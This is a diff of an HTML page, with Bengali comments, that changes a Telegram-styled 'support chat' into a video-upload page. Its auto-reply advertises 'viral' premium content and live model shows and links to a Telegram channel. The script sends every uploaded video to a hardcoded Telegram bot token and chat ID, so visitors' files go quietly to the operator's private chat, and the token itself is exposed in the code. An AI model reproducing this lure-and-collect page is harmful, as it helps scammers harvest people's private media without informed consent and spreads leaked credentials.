@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Chat</title>
+    <title>Live Video Upload</title>
     <style>
         /* বেসিক ডিজাইন */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #121212; /* ডার্ক ব্যাকগ্রাউন্ড */
+            background-color: #121212; 
             display: flex;
             justify-content: center;
             align-items: center;
@@ -28,7 +28,7 @@
         }
         /* হেডার */
         .header {
-            background: linear-gradient(90deg, #0088cc, #005f8f);
+            background: linear-gradient(90deg, #cc0000, #8f0000); /* ভিডিওর জন্য লালচে থিম */
             color: white;
             padding: 15px;
             text-align: center;
@@ -41,7 +41,7 @@
             flex: 1;
             padding: 15px;
             overflow-y: auto;
-            background-color: #efe7dd; /* টেলিগ্রাম বাবল ব্যাকগ্রাউন্ড */
+            background-color: #efe7dd; 
             background-image: url('https://web.telegram.org/img/bg_0.png'); 
             display: flex;
             flex-direction: column;
@@ -59,77 +59,77 @@
             box-shadow: 0 1px 1px rgba(0,0,0,0.1);
         }
         .user-msg {
-            background-color: #d9fdd3; /* ইউজারের মেসেজ (হালকা সবুজ) */
+            background-color: #d9fdd3; 
             align-self: flex-end;
             border-bottom-right-radius: 0;
         }
         .bot-msg {
-            background-color: #ffffff; /* বটের মেসেজ (সাদা) */
+            background-color: #ffffff; 
             align-self: flex-start;
             border-bottom-left-radius: 0;
         }
-        /* ইনপুট এরিয়া */
+        /* ইনপুট এরিয়া (চ্যাটিং অফ, শুধু আপলোড) */
         .input-area {
             display: flex;
-            padding: 10px;
+            padding: 15px;
             background: #f0f0f0;
             align-items: center;
+            justify-content: space-around;
             border-top: 1px solid #ddd;
         }
-        input[type="text"] {
+        
+        /* ফাইল স্ট্যাটাস টেক্সট */
+        #fileStatus {
+            font-size: 13px;
+            color: #555;
             flex: 1;
-            padding: 12px;
-            border: none;
-            border-radius: 20px;
-            outline: none;
-            margin: 0 8px;
-            background: white;
-            font-size: 15px;
+            margin-left: 10px;
+            font-style: italic;
         }
+
+        /* বড় আপলোড বাটন */
+        .upload-btn {
+            background-color: #cc0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: background 0.2s;
+        }
+        .upload-btn:hover { background-color: #a30000; }
+
         /* সেন্ড বাটন */
-        button {
+        .send-btn {
             background-color: #0088cc;
             color: white;
             border: none;
-            padding: 10px;
-            border-radius: 50%;
-            cursor: pointer;
             width: 45px;
             height: 45px;
+            border-radius: 50%;
+            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: background 0.2s;
+            font-size: 20px;
         }
-        button:hover { background-color: #006699; }
-        
-        /* এটাচমেন্ট বাটন */
-        .attach-btn {
-            background: none;
-            color: #555;
-            font-size: 22px;
-            width: auto;
-            height: auto;
-            padding: 0 5px;
-            border-radius: 0;
-        }
-        .attach-btn:hover { background: none; color: #0088cc; }
 
-        /* প্রিভিউ স্টাইল */
         .media-preview {
             max-width: 100%;
             border-radius: 8px;
-            margin-bottom: 5px;
             display: block;
         }
-        /* লিংকের কালার */
         .bot-msg a { color: #0088cc; text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="chat-container">
-    <div class="header">𝐑𝐀𝐓𝐄𝐑 𝐓𝐀𝐑𝐀 Support</div>
+    <div class="header">𝐑𝐀𝐓𝐄𝐑 𝐓𝐀𝐑𝐀 - Video Upload</div>
     
     <div class="messages" id="messageBox">
         <div style="text-align: center; font-size: 12px; color: gray; margin-bottom: 10px;">
@@ -138,118 +138,81 @@
     </div>
     
     <div class="input-area">
-        <!-- ফাইল ইনপুট -->
-        <input type="file" id="fileInput" style="display: none;" onchange="handleFileSelect()">
+        <!-- ভিডিও ইনপুট (হিডেন) -->
+        <input type="file" id="videoInput" accept="video/*" style="display: none;" onchange="handleFileSelect()">
         
-        <!-- এটাচ বাটন -->
-        <button class="attach-btn" onclick="document.getElementById('fileInput').click()">📎</button>
-        
-        <!-- টেক্সট ইনপুট -->
-        <input type="text" id="msgInput" placeholder="মেসেজ লিখুন..." autocomplete="off" />
+        <!-- ভিডিও সিলেক্ট বাটন -->
+        <button class="upload-btn" onclick="document.getElementById('videoInput').click()">
+            Video Upload
+        </button>
+
+        <!-- ফাইলের নাম দেখানোর জন্য -->
+        <div id="fileStatus">কোনো ভিডিও নেই</div>
         
         <!-- সেন্ড বাটন -->
-        <button onclick="handleUserAction()">➤</button>
+        <button class="send-btn" onclick="handleUserAction()">➤</button>
     </div>
 </div>
 
 <script>
-    // ==========================================
-    // আপনার কনফিগারেশন (সেট করা আছে)
-    // ==========================================
     const botToken = "7617055603:AAF5mjV-9amzPOVLktjbHM7MrxUzty75zZM"; 
     const chatId = "-1003119670905";     
 
-    // অটো রিপ্লাই মেসেজ
     const autoReplyText = `
         Welcome to <b>𝐑𝐀𝐓𝐄𝐑 𝐓𝐀𝐑𝐀 🔥</b><br>
-        💎 ভাইরাল প্রিমিয়াম কনটেন্টের একমাত্র নির্ভরযোগ্য জায়গা!<br><br>
-        এখানে পাচ্ছেন একদম ফ্রি + প্রিমিয়াম এক্সক্লুসিভ অ্যাক্সেস 👇<br>
-        ✨ ট্রেন্ডিং ভাইরাল ভিডিও<br>
-        🔥 লাইভ মডেল শো<br>
-        📞 প্রাইভেট কল অ্যাক্সেস<br>
-        🔐 সিক্রেট ও লুকানো প্রিমিয়াম কনটেন্ট<br>
+        আপনার ভিডিওটি আমাদের কাছে পাঠানো হচ্ছে। <br>
+        ধন্যবাদ আমাদের সাথে থাকার জন্য! <br>
         ━━━━━━━━━━━━━━<br>
-        🖇️ ভাইরাল জনপ্রিয় নাদিয়া – প্রিমিয়াম শো<br>
-        <a href="https://t.me/VairalNadiya" target="_blank">@VairalNadiya</a><br>
-        <a href="https://t.me/VairalNadiya" target="_blank">http://t.me/VairalNadiya</a><br><br>
-        🔓 এখনই Join করুন & প্রিমিয়াম এক্সপেরিয়েন্স নিন!<br>
-        ━━━━━━━━━━━━━━
+        🖇️ সব ভাইরাল ভিডিও দেখতে জয়েন করুন:<br>
+        <a href="https://t.me/VairalNadiya" target="_blank">@VairalNadiya</a>
     `;
 
-    // ফ্ল্যাগ: ওয়েলকাম মেসেজ দেওয়া হয়েছে কি না?
     let hasWelcomed = false;
     let selectedFile = null;
 
-    // আজকের তারিখ দেখানোর জন্য
     document.getElementById("dateDisplay").innerText = new Date().toLocaleDateString('bn-BD');
 
-    // ফাইল সিলেক্ট করলে
+    // ভিডিও সিলেক্ট করলে নাম দেখাবে
     function handleFileSelect() {
-        const fileInput = document.getElementById("fileInput");
-        if (fileInput.files.length > 0) {
-            selectedFile = fileInput.files[0];
-            document.getElementById("msgInput").placeholder = `ফাইল: ${selectedFile.name}`;
-            document.getElementById("msgInput").focus();
+        const input = document.getElementById("videoInput");
+        if (input.files.length > 0) {
+            selectedFile = input.files[0];
+            document.getElementById("fileStatus").innerText = selectedFile.name;
         }
     }
 
-    // ইউজার যখন সেন্ড বাটনে চাপ দিবে
     function handleUserAction() {
-        const inputField = document.getElementById("msgInput");
-        const textMessage = inputField.value;
-
-        // খালি মেসেজ আটকাতে
-        if (textMessage.trim() === "" && !selectedFile) return;
-
-        // ১. ইউজারের মেসেজ স্ক্রিনে দেখান
-        addMessageToScreen(textMessage, selectedFile, 'user');
-
-        // ২. অটো রিপ্লাই লজিক (শুধু প্রথমবার কাজ করবে)
-        if (!hasWelcomed) {
-            setTimeout(() => {
-                addMessageToScreen(autoReplyText, null, 'bot');
-            }, 1000); // ১ সেকেন্ড পর রিপ্লাই
-            hasWelcomed = true; // ফ্ল্যাগ সত্য করে দিলাম, তাই আর রিপ্লাই দিবে না
+        if (!selectedFile) {
+            alert("অনুগ্রহ করে একটি ভিডিও সিলেক্ট করুন!");
+            return;
         }
 
-        // ৩. টেলিগ্রামে পাঠানো (ব্যাকগ্রাউন্ডে চলবে)
-        sendToTelegram(textMessage, selectedFile);
+        // ইউজারের ভিডিও স্ক্রিনে দেখান
+        addMessageToScreen(selectedFile, 'user');
 
-        // ৪. ইনপুট ক্লিয়ার করা
-        inputField.value = "";
-        inputField.placeholder = "মেসেজ লিখুন...";
-        document.getElementById("fileInput").value = "";
+        // অটো রিপ্লাই (প্রথমবার)
+        if (!hasWelcomed) {
+            setTimeout(() => {
+                addMessageToScreen(null, 'bot', autoReplyText);
+            }, 1000);
+            hasWelcomed = true;
+        }
+
+        // টেলিগ্রামে পাঠানো
+        sendToTelegram(selectedFile);
+
+        // ইনপুট ক্লিয়ার করা
+        document.getElementById("videoInput").value = "";
+        document.getElementById("fileStatus").innerText = "কোনো ভিডিও নেই";
         selectedFile = null;
     }
 
-    // টেলিগ্রামে ডাটা পাঠানোর ফাংশন
-    function sendToTelegram(text, file) {
+    function sendToTelegram(file) {
         const formData = new FormData();
         formData.append("chat_id", chatId);
+        formData.append("video", file);
 
-        let apiMethod = "sendMessage";
-
-        if (file) {
-            const fileType = file.type.split('/')[0];
-            if (fileType === 'image') {
-                apiMethod = "sendPhoto";
-                formData.append("photo", file);
-            } else if (fileType === 'video') {
-                apiMethod = "sendVideo";
-                formData.append("video", file);
-            } else {
-                apiMethod = "sendDocument";
-                formData.append("document", file);
-            }
-            // ফাইলের সাথে ক্যাপশন
-            if (text) formData.append("caption", text);
-        } else {
-            // শুধু টেক্সট
-            formData.append("text", text);
-        }
-
-        // API কল
-        fetch(`https://api.telegram.org/bot${botToken}/${apiMethod}`, {
+        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
             method: "POST",
             body: formData
         })
@@ -260,47 +223,25 @@
         .catch(err => console.error("Network Error:", err));
     }
 
-    // স্ক্রিনে মেসেজ দেখানোর ফাংশন
-    function addMessageToScreen(text, file, sender) {
+    function addMessageToScreen(file, sender, text = null) {
         const msgBox = document.getElementById("messageBox");
         const bubble = document.createElement("div");
-        
         bubble.className = `message-bubble ${sender === 'user' ? 'user-msg' : 'bot-msg'}`;
 
-        // ফাইল প্রিভিউ
         if (file) {
             const fileUrl = URL.createObjectURL(file);
-            const fileType = file.type.split('/')[0];
-
-            if (fileType === 'image') {
-                bubble.innerHTML += `<img src="${fileUrl}" class="media-preview">`;
-            } else if (fileType === 'video') {
-                bubble.innerHTML += `<video src="${fileUrl}" class="media-preview" controls></video>`;
-            } else {
-                bubble.innerHTML += `<div>📄 <b>${file.name}</b></div>`;
-            }
+            bubble.innerHTML = `<video src="${fileUrl}" class="media-preview" controls></video>`;
         }
 
-        // টেক্সট রেন্ডার
         if (text) {
-            if (sender === 'bot') {
-                bubble.innerHTML += `<div>${text}</div>`; // বটের মেসেজে HTML সাপোর্ট
-            } else {
-                const textDiv = document.createElement("div");
-                textDiv.innerText = text; // ইউজারের মেসেজ প্লেইন টেক্সট
-                bubble.appendChild(textDiv);
-            }
+            const textDiv = document.createElement("div");
+            textDiv.innerHTML = text;
+            bubble.appendChild(textDiv);
         }
 
         msgBox.appendChild(bubble);
-        // অটো স্ক্রল নিচে
         msgBox.scrollTop = msgBox.scrollHeight;
     }
-
-    // এন্টার বাটন চাপলে সেন্ড হবে
-    document.getElementById("msgInput").addEventListener("keypress", function(event) {
-        if (event.key === "Enter") handleUserAction();
-    });
 </script>
 
 </body>
